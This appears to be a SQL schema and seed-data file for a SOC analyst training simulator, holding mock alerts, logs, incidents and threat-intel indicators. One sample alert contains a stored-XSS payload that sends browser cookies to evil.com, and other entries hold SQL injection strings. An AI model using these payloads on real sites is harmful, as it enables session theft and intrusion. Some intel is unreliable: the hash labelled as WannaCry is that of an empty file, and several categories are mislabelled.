-- ShadowWatch SOC Training Simulator
-- Database Schema v2 (aligned with application code)
-- =====================================================

SET FOREIGN_KEY_CHECKS = 0;

-- =====================
-- TABLE DEFINITIONS
-- =====================

-- Users Table
CREATE TABLE IF NOT EXISTS users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) UNIQUE NOT NULL,
    email VARCHAR(100) UNIQUE NOT NULL,
    password_hash VARCHAR(255) NOT NULL,
    role ENUM('analyst','senior_analyst','admin') DEFAULT 'analyst',
    score INT DEFAULT 0,
    level INT DEFAULT 1,
    preferences JSON DEFAULT NULL,
    is_active TINYINT(1) DEFAULT 1,
    last_login DATETIME DEFAULT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
);

-- Sessions Table
CREATE TABLE IF NOT EXISTS user_sessions (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT NOT NULL,
    session_token VARCHAR(255) UNIQUE NOT NULL,
    ip_address VARCHAR(45),
    expires_at DATETIME NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- Attack Scenarios Table
CREATE TABLE IF NOT EXISTS scenarios (
    id INT AUTO_INCREMENT PRIMARY KEY,
    title VARCHAR(255) NOT NULL,
    description TEXT,
    category VARCHAR(100),
    severity ENUM('info','low','medium','high','critical') DEFAULT 'medium',
    difficulty ENUM('beginner','easy','medium','hard','expert') DEFAULT 'medium',
    points INT DEFAULT 50,
    alert_types VARCHAR(255) DEFAULT NULL,
    time_to_complete INT DEFAULT 30,
    is_active TINYINT(1) DEFAULT 1,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Alerts Table
CREATE TABLE IF NOT EXISTS alerts (
    id INT AUTO_INCREMENT PRIMARY KEY,
    scenario_id INT DEFAULT NULL,
    incident_id INT DEFAULT NULL,
    title VARCHAR(255) NOT NULL,
    description TEXT,
    severity ENUM('info','low','medium','high','critical') NOT NULL DEFAULT 'medium',
    category VARCHAR(100),
    source_ip VARCHAR(45),
    dest_ip VARCHAR(45),
    source_port INT DEFAULT NULL,
    dest_port INT DEFAULT NULL,
    protocol VARCHAR(20),
    status ENUM('open','acknowledged','resolved','false_positive','escalated') DEFAULT 'open',
    assigned_to INT DEFAULT NULL,
    resolved_by INT DEFAULT NULL,
    resolution_notes TEXT,
    points_value INT DEFAULT 25,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    acknowledged_at DATETIME DEFAULT NULL,
    resolved_at DATETIME DEFAULT NULL,
    FOREIGN KEY (scenario_id) REFERENCES scenarios(id) ON DELETE SET NULL,
    FOREIGN KEY (assigned_to) REFERENCES users(id) ON DELETE SET NULL,
    FOREIGN KEY (resolved_by) REFERENCES users(id) ON DELETE SET NULL
);

-- Incidents Table
CREATE TABLE IF NOT EXISTS incidents (
    id INT AUTO_INCREMENT PRIMARY KEY,
    ticket_number VARCHAR(20) UNIQUE NOT NULL,
    title VARCHAR(255) NOT NULL,
    description TEXT,
    severity ENUM('info','low','medium','high','critical') NOT NULL DEFAULT 'medium',
    category VARCHAR(100),
    status ENUM('open','investigating','contained','eradicated','recovering','closed') DEFAULT 'open',
    notes TEXT,
    created_by INT NOT NULL,
    assigned_to INT DEFAULT NULL,
    alert_id INT DEFAULT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    closed_at DATETIME DEFAULT NULL,
    FOREIGN KEY (created_by) REFERENCES users(id) ON DELETE CASCADE,
    FOREIGN KEY (assigned_to) REFERENCES users(id) ON DELETE SET NULL,
    FOREIGN KEY (alert_id) REFERENCES alerts(id) ON DELETE SET NULL
);

-- System Logs Table
CREATE TABLE IF NOT EXISTS system_logs (
    id INT AUTO_INCREMENT PRIMARY KEY,
    alert_id INT DEFAULT NULL,
    source VARCHAR(100),
    host VARCHAR(100),
    log_type ENUM('info','warning','error','critical','debug') DEFAULT 'info',
    message TEXT,
    raw_log TEXT NOT NULL,
    ip_address VARCHAR(45),
    is_malicious TINYINT(1) DEFAULT 0,
    analysed_by INT DEFAULT NULL,
    analysed_at DATETIME DEFAULT NULL,
    verdict ENUM('malicious','suspicious','benign','unknown') DEFAULT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (alert_id) REFERENCES alerts(id) ON DELETE SET NULL,
    FOREIGN KEY (analysed_by) REFERENCES users(id) ON DELETE SET NULL
);

-- Threat Intelligence Table
CREATE TABLE IF NOT EXISTS threat_intel (
    id INT AUTO_INCREMENT PRIMARY KEY,
    indicator VARCHAR(255) NOT NULL,
    indicator_type ENUM('ip','domain','hash','url','email') NOT NULL,
    threat_type VARCHAR(100),
    confidence ENUM('low','medium','high') DEFAULT 'medium',
    description TEXT,
    tags JSON DEFAULT NULL,
    is_active TINYINT(1) DEFAULT 1,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    INDEX idx_indicator (indicator),
    INDEX idx_type (indicator_type)
);

-- Score Events Table
CREATE TABLE IF NOT EXISTS score_events (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT NOT NULL,
    event_type VARCHAR(100) NOT NULL,
    points INT NOT NULL DEFAULT 0,
    reference_id INT DEFAULT NULL,
    description VARCHAR(255),
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- Badges Table
CREATE TABLE IF NOT EXISTS badges (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(100) NOT NULL,
    description TEXT,
    icon VARCHAR(50),
    requirement_type VARCHAR(50),
    requirement_value INT DEFAULT 0,
    points_required INT DEFAULT 0,
    points_bonus INT DEFAULT 0
);

-- User Badges (earned badges)
CREATE TABLE IF NOT EXISTS user_badges (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT NOT NULL,
    badge_id INT NOT NULL,
    earned_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    UNIQUE KEY uq_user_badge (user_id, badge_id),
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    FOREIGN KEY (badge_id) REFERENCES badges(id) ON DELETE CASCADE
);

-- Activity Log Table
CREATE TABLE IF NOT EXISTS activity_log (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT DEFAULT NULL,
    action VARCHAR(100) NOT NULL,
    details TEXT,
    ip_address VARCHAR(45),
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE SET NULL
);

SET FOREIGN_KEY_CHECKS = 1;

-- =====================
-- SEED DATA
-- =====================

-- Users (password for all: "password")
INSERT IGNORE INTO users (username, email, password_hash, role, score, level) VALUES
('admin',   'admin@shadowwatch.local',   '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi', 'admin',          9999, 10),
('jsmith',  'jsmith@shadowwatch.local',  '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi', 'senior_analyst',  4750,  7),
('alee',    'alee@shadowwatch.local',    '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi', 'analyst',         2310,  4),
('mchen',   'mchen@shadowwatch.local',   '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi', 'analyst',         1890,  3),
('rgarcia', 'rgarcia@shadowwatch.local', '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi', 'analyst',          980,  2);

-- Scenarios
INSERT IGNORE INTO scenarios (title, description, category, severity, difficulty, points, alert_types, time_to_complete) VALUES
('SQL Injection Attack',        'Multiple malformed SQL queries detected from external IP targeting the login endpoint. Payloads include UNION SELECT and OR 1=1 patterns.',                                                        'malware',          'high',     'beginner',  50,  'web,auth',          20),
('Ransomware Execution',        'Endpoint detection flagged suspicious file encryption activity. explorer.exe spawning cmd.exe and vssadmin.exe to delete shadow copies.',                                                          'ransomware',       'critical', 'hard',     150,  'endpoint,malware',  45),
('Phishing Email Campaign',     'Multiple users received emails with malicious attachments mimicking HR documents. Several users have clicked the links.',                                                                          'phishing',         'high',     'easy',      75,  'email,auth',        30),
('DDoS Attack on Web Server',   'Incoming traffic spike of 50,000 requests/sec from 200+ IPs. Web server response times degrading rapidly.',                                                                                       'malware',          'critical', 'medium',   100,  'network,firewall',  25),
('SSH Brute Force',             'Over 5000 failed SSH login attempts from IP 185.234.219.75 in the last 10 minutes targeting root and admin accounts.',                                                                            'phishing',         'medium',   'beginner',  40,  'auth,network',      15),
('DNS Data Exfiltration',       'Unusual DNS traffic detected. Large number of TXT record queries to external domain harvest3r.net with base64-encoded data in subdomains.',                                                       'apt',              'critical', 'expert',   200,  'dns,network',       60),
('Insider Threat – Bulk DL',    'Employee account downloaded 15GB of confidential files at 2:47 AM outside normal working hours. VPN session from unusual location.',                                                              'insider_threat',   'high',     'medium',   120,  'auth,network',      35),
('Malware C2 Beacon',           'Endpoint making periodic HTTP requests every 60 seconds to known C2 server 91.108.4.23 using encoded POST data.',                                                                                 'malware',          'critical', 'hard',     175,  'network,endpoint',  40),
('Stored XSS Attack',           'Stored XSS payload found in comment field. Script tag injecting keylogger that exfiltrates form data to attacker domain.',                                                                       'malware',          'medium',   'easy',      45,  'web',               20),
('Lateral Movement – PtH',      'Suspicious NTLM authentication attempts across multiple systems using same credential hash. Classic pass-the-hash lateral movement pattern.',                                                     'apt',              'critical', 'expert',   250,  'auth,network',      60);

-- Threat Intel IOCs
INSERT IGNORE INTO threat_intel (indicator, indicator_type, threat_type, confidence, description, tags) VALUES
('185.234.219.75',                        'ip',     'Brute Force / Scanner',    'high',   'Known malicious IP associated with SSH brute force campaigns and credential stuffing.',      '["brute_force","scanner","botnet"]'),
('91.108.4.23',                           'ip',     'Command & Control',         'high',   'Active C2 server for Emotet malware family. Seen in campaigns targeting financial sector.',  '["c2","emotet","malware"]'),
('harvest3r.net',                         'domain', 'Data Exfiltration',         'high',   'Domain used for DNS tunneling. Registered 30 days ago with privacy-protected WHOIS.',       '["dns_tunnel","exfiltration"]'),
('malware-drop.ru',                       'domain', 'Malware Distribution',      'high',   'Known malware dropper site. Hosts exploit kits and ransomware payloads.',                   '["malware","dropper","ransomware"]'),
('d41d8cd98f00b204e9800998ecf8427e',      'hash',   'Ransomware',                'high',   'MD5 hash of WannaCry ransomware sample. Do not execute.',                                   '["ransomware","wannacry"]'),
('45.33.32.156',                          'ip',     'Port Scanner',              'medium', 'Shodan-operated scanning IP. Usually benign but generates high scan volume.',               '["scanner","shodan","recon"]'),
('phish-kit.xyz',                         'domain', 'Phishing',                  'high',   'Active phishing kit distribution domain. Impersonates Microsoft 365 login pages.',          '["phishing","microsoft","credential_theft"]'),
('192.168.100.200',                       'ip',     'Internal Suspicious',       'medium', 'Internal IP with anomalous outbound traffic patterns. Possible compromised host.',          '["internal","suspicious","pivot"]');

-- Badges
INSERT IGNORE INTO badges (name, description, icon, requirement_type, requirement_value, points_required, points_bonus) VALUES
('First Blood',        'Resolve your first alert',                        '🎯', 'alerts_resolved',  1,    0,    50),
('Alert Hunter',       'Resolve 25 alerts',                               '🏹', 'alerts_resolved',  25,   0,   200),
('Incident Commander', 'Create 10 incident tickets',                      '📋', 'incidents_created', 10,  0,   150),
('Log Master',         'Analyze 50 log entries',                          '📊', 'logs_analyzed',    50,   0,   300),
('Perfect Score',      'Achieve 100% accuracy on 10 consecutive alerts',  '⭐', 'accuracy_streak',  10,   0,   500),
('Threat Hunter',      'Identify 5 critical threats',                     '🔍', 'critical_resolved', 5,   0,   400),
('Speed Demon',        'Resolve an alert in under 60 seconds',            '⚡', 'speed_resolve',    60,   0,   100),
('Veteran Analyst',    'Reach level 5',                                   '🎖️','level',              5,   0,  1000);

-- Sample Alerts
INSERT IGNORE INTO alerts (scenario_id, title, description, severity, category, source_ip, dest_ip, source_port, dest_port, protocol, status, points_value, created_at) VALUES
(1,    'SQL Injection Detected on /login.php',         'Multiple SQL injection payloads detected. Payload: '' OR 1=1--',                                             'high',     'malware',       '45.55.123.87',    '10.0.1.5',   52341, 443, 'HTTPS', 'open',         50,  NOW()),
(5,    'SSH Brute Force from 185.234.219.75',          '5,247 failed SSH login attempts in 10 minutes targeting root, admin, ubuntu.',                              'medium',   'phishing',      '185.234.219.75',  '10.0.1.10',  49201,  22, 'SSH',   'open',         40,  NOW()),
(4,    'DDoS Attack – SYN Flood',                      'SYN flood attack. Rate: 52,000 pkts/sec from botnet.',                                                      'critical', 'malware',       '0.0.0.0',         '10.0.1.5',       0,  80, 'TCP',   'open',        100,  NOW()),
(8,    'Malware C2 Beacon from WORKSTATION-047',       'Regular HTTP beaconing to 91.108.4.23 every 60s. Suspicious process: svchost32.exe.',                       'critical', 'malware',       '10.0.2.47',       '91.108.4.23',49555,  80, 'HTTP',  'acknowledged', 175,  NOW()),
(3,    'Phishing Campaign – HR Themed',                'Multiple users received emails: "Q4 Bonus Information". Attachment: bonus_details.xlsm.',                   'high',     'phishing',      '203.0.113.45',    '10.0.0.0',      25,   0, 'SMTP',  'open',         75,  NOW()),
(6,    'DNS Tunneling to harvest3r.net',               'Anomalous DNS TXT queries. Subdomain: base64data.harvest3r.net (data exfiltration).',                       'critical', 'apt',           '10.0.2.33',       '8.8.8.8',   52100,  53, 'DNS',   'open',        200,  NOW()),
(7,    'Insider Threat – Bulk Data Download',          'User jdoe downloaded 15.3GB at 02:47 AM from file server. Logged in from Moscow IP.',                       'high',     'insider_threat','195.206.105.78',  '10.0.1.20', 61234, 445, 'SMB',   'open',        120,  NOW()),
(9,    'XSS Payload in Comments Module',               'Stored XSS: <script>document.location=\'http://evil.com/steal?c=\'+document.cookie</script>',              'medium',   'malware',       '78.91.123.44',    '10.0.1.5',  55123, 443, 'HTTPS', 'open',         45,  NOW());

-- Sample Incidents
INSERT IGNORE INTO incidents (ticket_number, title, description, severity, status, category, created_by, assigned_to, created_at) VALUES
('INC-2024-0001', 'Active Ransomware – Finance Workstations', 'Multiple finance workstations showing encryption activity. Shadow copies being deleted. Immediate containment required.', 'critical', 'investigating', 'ransomware',       1, 2, NOW()),
('INC-2024-0002', 'Phishing Campaign Response',               'HR-themed phishing campaign. 3 users confirmed opened attachment. Email gateway quarantine initiated.',                    'high',     'open',         'phishing',         2, 3, NOW()),
('INC-2024-0003', 'SSH Brute Force Containment',              'Blocking malicious IP and reviewing auth logs for successful logins.',                                                      'medium',   'closed',       'phishing',         3, 4, NOW());

-- Sample System Logs
INSERT IGNORE INTO system_logs (alert_id, source, host, log_type, message, raw_log, ip_address, is_malicious, created_at) VALUES
(1, 'nginx/access.log',  'srv-web01', 'error',    'SQL injection attempt on /login.php',         '[2024-01-15 14:32:11] [error] [nginx] POST /login.php HTTP/1.1 - sqlmap/1.7.8',                           '185.234.219.75', 1, NOW()),
(1, 'nginx/access.log',  'srv-web01', 'error',    'SQLi payload: username=admin OR 1=1',         '[2024-01-15 14:32:12] [error] [nginx] POST /login.php?username=admin%27+OR+1=1-- 403',                    '185.234.219.75', 1, NOW()),
(2, '/var/log/auth.log', 'srv-ssh01', 'error',    'Failed SSH login for root',                   '[2024-01-15 14:35:01] sshd[12847]: Failed password for root from 185.234.219.75 port 49201 ssh2',         '185.234.219.75', 1, NOW()),
(2, '/var/log/auth.log', 'srv-ssh01', 'error',    'Failed SSH login for admin',                  '[2024-01-15 14:35:02] sshd[12848]: Failed password for admin from 185.234.219.75 port 49202 ssh2',        '185.234.219.75', 1, NOW()),
(4, 'EDR/CarbonBlack',   'ws-047',    'critical', 'C2 connection from svchost32.exe',            '[2024-01-15 14:40:11] ALERT: svchost32.exe (PID:4821) -> 91.108.4.23:80. Hash: d41d8cd98f00b204e9800998ecf8427e', '91.108.4.23',   1, NOW()),
(NULL, 'pfsense/filter', 'gw-01',    'info',     'Allowed outbound DNS query',                  '[2024-01-15 09:12:33] PASS TCP 10.0.2.15:52341 -> 8.8.8.8:53 [DNS google.com]',                           '10.0.2.15',      0, NOW()),
(6,   'bind/query.log',  'srv-dns',   'warning',  'Suspicious DNS TXT query – possible tunnel',  '[2024-01-15 10:01:44] client 10.0.2.33: query: aGVsbG8gd29ybGQ.harvest3r.net IN TXT',                     '10.0.2.33',      1, NOW()),
(4,   'zeek/conn.log',   'gw-01',    'critical', 'Periodic C2 beaconing detected (60s interval)','[2024-01-15 11:25:33] conn: 10.0.2.47:49555 -> 91.108.4.23:80 tcp http 60.1s 512B->1024B',               '10.0.2.47',      1, NOW());
